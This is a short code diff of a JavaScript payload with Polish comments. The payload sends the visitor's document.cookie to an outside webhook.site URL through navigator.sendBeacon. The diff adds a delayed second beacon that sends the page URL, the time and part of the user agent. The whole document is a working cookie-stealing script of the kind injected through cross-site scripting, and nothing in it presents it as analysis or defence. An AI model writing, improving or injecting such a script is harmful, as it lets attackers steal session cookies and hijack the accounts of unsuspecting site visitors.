@@ -1,11 +1,16 @@
 (function() {
     const url = "https://webhook.site/53158f3f-579b-4186-8cdd-d33333543bec";
-    const cookie = document.cookie;
+    
+    // Główna wysyłka cookie
+    navigator.sendBeacon(url, "COOKIE: " + document.cookie);
 
-    navigator.sendBeacon(url, "COOKIE: " + cookie);
-
-    // Dodatkowe info
+    // Dodatkowe informacje
     setTimeout(() => {
-        navigator.sendBeacon(url, "URL: " + window.location.href);
-    }, 1000);
+        const extra = {
+            url: window.location.href,
+            time: new Date().toLocaleString(),
+            userAgent: navigator.userAgent.substring(0, 100)
+        };
+        navigator.sendBeacon(url, "EXTRA: " + JSON.stringify(extra));
+    }, 800);
 })();
